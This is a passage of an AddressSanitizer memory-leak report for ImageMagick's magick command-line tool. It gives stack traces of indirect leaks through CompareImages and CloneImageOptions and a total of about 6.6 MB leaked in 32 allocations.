#0 0xffffb665a2f4 in __interceptor_malloc ../../../../src/libsanitizer/asan/asan_malloc_linux.cpp:145
#1 0xffffb5f338c0 in AcquireMagickMemory MagickCore/memory.c:478
#2 0xffffb5f33918 in AcquireQuantumMemory MagickCore/memory.c:551
#3 0xffffb6059f0c in ConstantString MagickCore/string.c:713
#4 0xffffb6032b10 in CloneSplayTree MagickCore/splay-tree.c:372
#5 0xffffb5f99f7c in CloneImageProperties MagickCore/property.c:196
#6 0xffffb5ef8170 in CloneImage MagickCore/image.c:839
#7 0xffffb606c698 in ExtentImage MagickCore/transform.c:1134
#8 0xffffb5dd48b4 in CompareImages MagickCore/compare.c:188
#9 0xffffb5b096e8 in CLIListOperatorImages MagickWand/operation.c:3880
#10 0xffffb5b11f94 in CLIOption MagickWand/operation.c:5279
#11 0xffffb59bb6c8 in ProcessCommandOptions MagickWand/magick-cli.c:477
#12 0xffffb59bcf64 in MagickImageCommand MagickWand/magick-cli.c:796
#13 0xffffb59fa49c in MagickCommandGenesis MagickWand/mogrify.c:185
#14 0xaaaab2d1024c in MagickMain utilities/magick.c:149
#15 0xaaaab2d104d8 in main utilities/magick.c:180
#16 0xffffb53973f8 in __libc_start_call_main ../sysdeps/nptl/libc_start_call_main.h:58
#17 0xffffb53974c8 in __libc_start_main_impl ../csu/libc-start.c:392
#18 0xaaaab2d0fc2c in _start (/usr/local/bin/magick+0x1c2c)

Indirect leak of 16 byte(s) in 2 object(s) allocated from:
#0 0xffffb665a2f4 in __interceptor_malloc ../../../../src/libsanitizer/asan/asan_malloc_linux.cpp:145
#1 0xffffb5f338c0 in AcquireMagickMemory MagickCore/memory.c:478
#2 0xffffb5f33918 in AcquireQuantumMemory MagickCore/memory.c:551
#3 0xffffb6059f0c in ConstantString MagickCore/string.c:713
#4 0xffffb6032b10 in CloneSplayTree MagickCore/splay-tree.c:372
#5 0xffffb5f55fb0 in CloneImageOptions MagickCore/option.c:2144
#6 0xffffb5efa87c in CloneImageInfo MagickCore/image.c:1010
#7 0xffffb5f07330 in SyncImageSettings MagickCore/image.c:4242
#8 0xffffb5f05b9c in SyncImagesSettings MagickCore/image.c:4000
#9 0xffffb5b11e24 in CLIOption MagickWand/operation.c:5246
#10 0xffffb59bb6c8 in ProcessCommandOptions MagickWand/magick-cli.c:477
#11 0xffffb59bcf64 in MagickImageCommand MagickWand/magick-cli.c:796
#12 0xffffb59fa49c in MagickCommandGenesis MagickWand/mogrify.c:185
#13 0xaaaab2d1024c in MagickMain utilities/magick.c:149
#14 0xaaaab2d104d8 in main utilities/magick.c:180
#15 0xffffb53973f8 in __libc_start_call_main ../sysdeps/nptl/libc_start_call_main.h:58
#16 0xffffb53974c8 in __libc_start_main_impl ../csu/libc-start.c:392
#17 0xaaaab2d0fc2c in _start (/usr/local/bin/magick+0x1c2c)

Indirect leak of 7 byte(s) in 2 object(s) allocated from:
#0 0xffffb665a2f4 in __interceptor_malloc ../../../../src/libsanitizer/asan/asan_malloc_linux.cpp:145
#1 0xffffb5f338c0 in AcquireMagickMemory MagickCore/memory.c:478
#2 0xffffb5f33918 in AcquireQuantumMemory MagickCore/memory.c:551
#3 0xffffb6059f0c in ConstantString MagickCore/string.c:713
#4 0xffffb6032b6c in CloneSplayTree MagickCore/splay-tree.c:373
#5 0xffffb5f55fb0 in CloneImageOptions MagickCore/option.c:2144
#6 0xffffb5efa87c in CloneImageInfo MagickCore/image.c:1010
#7 0xffffb5f07330 in SyncImageSettings MagickCore/image.c:4242
#8 0xffffb5f05b9c in SyncImagesSettings MagickCore/image.c:4000
#9 0xffffb5b11e24 in CLIOption MagickWand/operation.c:5246
#10 0xffffb59bb6c8 in ProcessCommandOptions MagickWand/magick-cli.c:477
#11 0xffffb59bcf64 in MagickImageCommand MagickWand/magick-cli.c:796
#12 0xffffb59fa49c in MagickCommandGenesis MagickWand/mogrify.c:185
#13 0xaaaab2d1024c in MagickMain utilities/magick.c:149
#14 0xaaaab2d104d8 in main utilities/magick.c:180
#15 0xffffb53973f8 in __libc_start_call_main ../sysdeps/nptl/libc_start_call_main.h:58
#16 0xffffb53974c8 in __libc_start_main_impl ../csu/libc-start.c:392
#17 0xaaaab2d0fc2c in _start (/usr/local/bin/magick+0x1c2c)

SUMMARY: AddressSanitizer: 6614160 byte(s) leaked in 32 allocation(s)
```



